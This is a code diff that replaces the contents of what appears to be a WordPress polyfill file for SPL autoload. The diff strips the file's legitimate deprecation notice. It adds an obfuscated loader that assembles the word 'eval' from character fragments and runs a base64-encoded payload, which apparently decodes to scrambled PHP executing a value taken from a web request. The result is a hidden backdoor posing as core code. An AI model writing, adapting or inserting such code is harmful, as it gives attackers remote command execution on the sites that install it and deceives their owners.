@@ -1,24 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Polyfill for SPL autoload feature. This file is separate to prevent compiler notices
- * on the deprecated __autoload() function.
- *
- * See https://core.trac.wordpress.org/ticket/41134
- *
- * @deprecated 5.3.0 No longer needed as the minimum PHP requirement has moved beyond PHP 5.3.
- *
- * @package PHP
- * @access private
- */
-
-_deprecated_file( basename( __FILE__ ), '5.3.0', '', 'SPL can no longer be disabled as of PHP 5.3.' );
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogQ2J5bHN2eXkgc2JlIEZDWSBuaGdieWJucSBzcm5naGVyLiBHdXZmIHN2eXIgdmYgZnJjbmVuZ3IgZ2IgY2VyaXJhZyBwYnpjdnlyZSBhYmd2cHJmCiAqIGJhIGd1ciBxcmNlcnBuZ3JxIF9fbmhnYnlibnEoKSBzaGFwZ3ZiYS4KICoKICogRnJyIHVnZ2NmOi8vcGJlci5nZW5wLmpiZXFjZXJmZi5iZXQvZ3ZweHJnLzQxMTM0CiAqCiAqIEBxcmNlcnBuZ3JxIDUuMy4wIEFiIHliYXRyZSBhcnJxcnEgbmYgZ3VyIHp2YXZ6aHogQ1VDIGVyZGh2ZXJ6cmFnIHVuZiB6YmlycSBvcmxiYXEgQ1VDIDUuMy4KICoKICogQGNucHhudHIgQ1VDCiAqIEBucHByZmYgY2V2aW5ncgogKi8KCl9xcmNlcnBuZ3JxX3N2eXIoIG9uZnJhbnpyKCBfX1NWWVJfXyApLCAnNS4zLjAnLCAnJywgJ0ZDWSBwbmEgYWIgeWJhdHJlIG9yIHF2Zm5veXJxIG5mIGJzIENVQyA1LjMuJyApOwoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
